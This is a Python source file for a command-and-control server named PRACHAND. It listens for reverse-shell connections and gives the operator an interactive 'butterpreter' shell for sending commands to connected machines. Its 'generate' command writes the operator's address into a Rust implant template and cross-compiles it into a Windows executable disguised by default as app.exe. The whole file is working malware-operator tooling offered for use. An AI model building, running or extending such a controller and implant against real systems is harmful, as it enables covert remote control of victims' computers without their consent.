import os
import socket
import subprocess
import threading  # Used to handle multiple connections
import time
from tabulate import tabulate  # Used to display tabless
import shutil
import platform

try:
    import readline
except Exception:
    import pyreadline

rust_installed = False  # This becomes true if rust is installed in the system
operating_system = "Linux"  # Its initial value is linux but it will detect your os inorder to download rust
sessions = []  # Array of sessions used while interaction
connections = []  # Array of connections [Used to handle connections]
conn_id = 1  # connection id, number of connections received
help_menu = [
    ["sessions", "Displays details about sessions if there are any"],
    ["sessions -i <SESSION ID>", "Interacts with a session and spawns a butterpreter shell"],
    ["generate", "Will ask about implant requirements and will generate implant accordingly"],
    ["exit", "Exit the c2 program"],
]

"""
This main_thread function is executed in a thread which always listens for incoming connections
After connection is received, it a appends an array of 2 things in the connections array[]
    [1] dont_ping(False): When it is false, it means we have to ping to maintain connection
        When true, it means that the operator is ready to send commands

    [1] is_alive(True)  : It is true to signify that the connection is alive
        it becomes false when an error is received and the connection breaks


After that an array of 3 things is appended to a new array(sessions) which include
    [1] conn_id: It helps to interact with session
    [2] address: It shows addresses and ports of the sessions
    [3] status : It shows if a session is active or inactive 

"""


def main_thread():
    global conn_id
    while True:
        conn, addr = s.accept()
        print(f"\n[+] Received a connection from {addr[0]}")
        connections.append([False, True])
        sessions.append([conn_id, f"{addr[0]}:{addr[1]}", "Active"])
        threading.Thread(target=handle_connection, args=(conn, conn_id - 1)).start()
        conn_id += 1


"""
This handle_connection function is used to handle each session and execute commands
It broadly consists of 1 while loop with 2 sub-while loops
The main while loop checks if the session is active
if the session is active, it will see if user is interacting with it
if user is not interacting, it will continuously send '#ping' to maintain connection in a while loop
if user is interacting, then it will jump to the second sub-while loop which is responsible for interaction 
"""


def handle_connection(conn, conn_id):
    try:
        while connections[conn_id][1]:
            while connections[conn_id][0] == False:
                try:
                    conn.send("#ping".encode())
                    time.sleep(2)
                except ConnectionResetError:
                    connections[conn_id][1] = False
                    print(f"\n[-] Session {conn_id + 1} died")
                    break

            while connections[conn_id][0]:
                try:
                    conn.send("#This_code_grabs_the_path_".encode())  # This code grabs the path
                except ConnectionResetError:
                    connections[sess_id][0] = False
                    connections[conn_id][1] = False
                    print("\n[-] Session Died!")
                    break
                cwd = conn.recv(1024).decode("latin-1")
                command = input(f"butterpreter({cwd}) > ".encode('latin-1').decode('latin-1'))

                try:
                    if command.split()[0] == "":
                        continue
                except IndexError:
                    continue

                if command.strip() == "cls" or command.strip() == "clear":
                    os.system("clear||cls")
                    continue

                if command.strip() == "exit" or command.strip() == "background":
                    connections[conn_id][0] = False
                    break

                if command.strip() == "powershell":
                    conn.send("powershell".encode())
                    print(conn.recv(1024).decode("latin-1"))
                    continue

                conn.send(command.encode())
                # response = conn.recv(1024).decode("latin-1")

                response = b""
                BUFF_SIZE = 1024
                while True:
                    part = conn.recv(BUFF_SIZE)
                    response += part
                    if len(part) < BUFF_SIZE:
                        break

                response = response.decode("latin-1")
                if response == "\n<>END<>":
                    continue

                response = response.split("\n")

                response = response[:-1]
                response = response[:-1]
                if len(response) >= 1 and response[-1] == '':
                    response = response[:-1]
                for i in range(len(response)):
                    response[i] = response[i] + '\n'

                response = ''.join(response)
                print(response)
    except ConnectionAbortedError:
        connections[conn_id][0] = False
        connections[conn_id][1] = False

"""
Exit prompt
"""
def exit_program():
    confirm_exit = input("Are you sure you want to exit the program [y/n]: ")
    if confirm_exit.lower() == "y" or confirm_exit.lower() == "yes":
        print("[*] Bye")
        os._exit(0)
    elif confirm_exit.lower() == "n" or confirm_exit.lower() == "no":
        print()
    else:
        exit_program()

"""
This function is used to detect is some package is installed
We will be basically using this function to check if rust is installed or not
"""
def package_check(package_name):
    check = subprocess.run(package_name, shell=True, capture_output=True)
    
    """I don't know why this standard way was not working
        it was showing rust is not installed even if was installed
        So I am writing my 'Jugaad' code below it"""
    # if check.returncode == 0:
    #     return True
    # elif check.returncode == 1:
    #     return False
    
    if len(check.stdout.decode().split()) > 5:
        return True
    else:
        return False

"""
This code checks if Mingw-64 is installed in a linux type operating system.
Mingw-64 is required to cross compile rust code into a windows binary.
"""
def mingw_64_check():
    try:
        output = subprocess.check_output(["dpkg", "-s", "mingw-w64"], stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        # If the dpkg command returns a non-zero exit code, the package is not installed
        return False
    else:
        # If the dpkg command succeeds, check if the "Status" field contains "installed"
        return True

"""
This code check if the INSTALLED mingw is configured with rustup.
If it is not configured, then it will configure it.
"""
def rustup_mingw_configure():
    output = subprocess.check_output("rustup target list", shell=True)
    if "x86_64-pc-windows-gnu (installed)" not in output.decode():
        print("\n[*] Configuring mingw64 with rustup, it is a one time process\n")
        configure = subprocess.run("rustup target add x86_64-pc-windows-gnu", shell=True)
        if configure.returncode == 0:
            print("\n[+] Mingw is successfully configured with rustup\n")



# The if else statement tells the OS user is using.
# This will help us to install Rust in case it is not installed.
if platform.system() == "Windows":
    operating_system = "Windows"
else:
    operating_system = "Linux"

# The code in below if statement installs mingw-w64 if it is not installed.
if operating_system == "Linux" and not mingw_64_check():
    print("[-] Mingw-w64 was not installed\n[*] You can install it manually by 'sudo apt-get install mingw-w64'\n")
    wonna_install_mingw = input("[*] Want us to install it for you automatically [Y/n]: ")
    if wonna_install_mingw.lower().strip() == "n" or  wonna_install_mingw.lower().strip() == "no":
        print("[-] Mingw-w64 is required to use the program")
        print("[*] Be back after installing it")
        print("[*] Exiting...")
        os._exit(0)
    else:
        ming_install_status = subprocess.run("sudo apt-get install mingw-w64 -y", shell=True)
        if ming_install_status.returncode == 0:
            print("\n[+] Mingw-w64 installed successfully!\n")


rust_check = package_check("rustup")  # Checking if rustup is working
cargo_check = package_check("cargo")  # Checking if cargo is working
if rust_check and cargo_check:
    rust_installed = True

# The if statement below will install rust if it is not installed.
if not rust_installed:
    print("[-] Rust is not installed\n")
    
    rust_install = input("Do you want to install Rust:[Y/n]: ")
    if rust_install.lower().strip() == "n" or rust_install.lower().strip() == "no":
        print("[-] Rust is required to use this program")
        print("[*] Exiting...")
        os._exit(0)
    else:
        if operating_system == "Linux":
            print("\n[*] Linux operating system detected\n")
            lets_install_rust_in_linux = subprocess.run("chmod +x rust_install.sh && ./rust_install.sh -y", shell=True)
            if lets_install_rust_in_linux.returncode == 0:
                print("↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ Ignore this I have alerdy done this for you")
                print("\n[+] Rust installed successfully!\n[*] PLEASE RESTART THE TERMINAL WINDOW TO ENSURE RUST IS WORKING\n")
                os._exit(0)
            
        else:
            print("[*] Windows operating system detected")
            subprocess.run(".\\rust_install.bat")
            lets_install_rust_in_windows = subprocess.run("chmod +x rust_install.sh && ./rust_install.sh -y", shell=True)
            if lets_install_rust_in_windows.returncode == 0:
                print("\n[+] Rust installed successfully!\n[*] PLEASE RESTART THE TERMINAL WINDOW TO ENSURE RUST IS WORKING\n")
                os._exit(0)

# configures rustup with mingw if it is not configured
if operating_system == "Linux":
    rustup_mingw_configure()


PORT = input("Enter port on which you want to start the listener [default:4444]: ")

if PORT.strip() == "":
    PORT = 4444

else:
    try:
        PORT = int(PORT)
        if PORT < 0 or PORT > 65535:
            print("Port specified cannot be less than 0 or greater than 65535")
            exit(0)
    except ValueError:
        print("[-] Invalid input!")
        exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(("", PORT))
except OSError:
    print("[-] Port alerdy in use")
    exit(0)
print("Started server on port 4444")

s.listen(4)
print(f"Will be waiting for connections on port {PORT}\n")

threading.Thread(target=main_thread).start()  # This code starts the main thread to start listening to connections

"""
This loop firstly starts the main c2 shell which can be used to interact with sessions
It checks for commands which can be used to interact and see the status of the shell
"""
while True:
    command = input("PRACHAND > ")

    if command.strip() == "":
        continue

    if command.strip() == "sessions":
        if sessions != []:

            # This code checks if the connections are active or dead and prints a table showing all connections
            for i in range(len(connections)):
                if connections[i][1]:
                    sessions[i][2] = "Active"
                else:
                    sessions[i][2] = "Died"
            print()
            print(tabulate(sessions, headers=["Session ID", "Address", "Status"]), end="\n\n")
            continue
        else:
            print("[-] No active sessions")
            continue

    # The code below is used to interact with specific sessions or machines
    elif command.split()[0] == "sessions" and command.split()[1] == "-i":  # and command.split()[2].isdigit():
        try:
            command.split()[2] = int(command.split()[2])
        except Exception:
            print("[-] Invalid Input")
            continue

        sess_id = int(command.split()[2]) - 1  # Checks the session id inputted by the user
        if sess_id <= len(connections) and sess_id >= 0:
            try:
                if connections[sess_id][1]:
                    connections[sess_id][0] = True
                else:
                    print("[-] Cannot interact with dead session")
            except IndexError:
                print("[-] Invalid Input")
                continue

            # if user is interacting with some session, this code will put c2 shell on hold
            while connections[sess_id][0]:
                time.sleep(2)

        else:
            print("[-] Invalid Input")

    elif command.strip() == "help":
        print(tabulate(help_menu, headers=["COMMAND", "DETAILS"]), end="\n\n")

    elif command.strip() == "generate":
        LHOST = input(f"Enter lhost IP of the implant [default:{socket.gethostbyname(socket.gethostname())}]: ")

        if LHOST.strip() == "":
            LHOST = socket.gethostbyname(socket.gethostname())

        LPORT = input(f"Enter lport of the implant [default:{PORT}]: ")

        if LPORT.strip() == "":
            LPORT = PORT
        else:
            try:
                LPORT = int(LPORT)
            except ValueError:
                print("[-] Invalid Port number")
                continue
        IMPLANT_NAME = input("Enter name of the implant [default:app.exe]: ")
        if IMPLANT_NAME.strip() == "":
            IMPLANT_NAME = "app.exe"
        
        current_path = os.getcwd()
        script_path = current_path + "/src/"
        release_path = current_path + "/target/release" if operating_system == "Windows" else current_path + "/target/x86_64-pc-windows-gnu/release/"
        os.chdir(script_path)
        
        with open("implant.rs", "rb") as file:
            lines = file.read().decode()
            lines = lines.replace("\r", "")

            if "127.0.0.1:4444" in lines:
                lines = lines.replace("127.0.0.1:4444", f"{LHOST}:{LPORT}")
        
        f = open("main.rs", "w")
        f.writelines(lines)
        f.close()
        
        os.chdir(current_path)
        
        generate_command = "cargo build --release" if operating_system == "Windows" else "cargo build --release --target x86_64-pc-windows-gnu"

        output = subprocess.run(generate_command, shell=True)
        os.chdir(script_path)

        os.chdir(release_path)
        
        if IMPLANT_NAME.endswith(".exe"):
            os.rename("app.exe", IMPLANT_NAME)
            shutil.copy(IMPLANT_NAME, current_path)
        else:
            os.rename("app.exe", IMPLANT_NAME + ".exe")
            shutil.copy(IMPLANT_NAME + ".exe", current_path)
        
        os.chdir(current_path)
        shutil.rmtree("target")
        
        if output.returncode == 0:
            if os.path.isfile(IMPLANT_NAME):
                pass
            elif os.path.isfile(IMPLANT_NAME + ".exe"):
                IMPLANT_NAME = IMPLANT_NAME + ".exe"

            print(f"\n[+] Windows binary generated and saved as {IMPLANT_NAME}\n")
        else:
            print(output.stderr.decode())
            print("[-] Windows binary could not be generated")

    elif command.strip() == "exit":
        exit_program()

    elif command.strip() == "clear":
        os.system("cls||clear")

    else:
        print("[-] Invalid command")
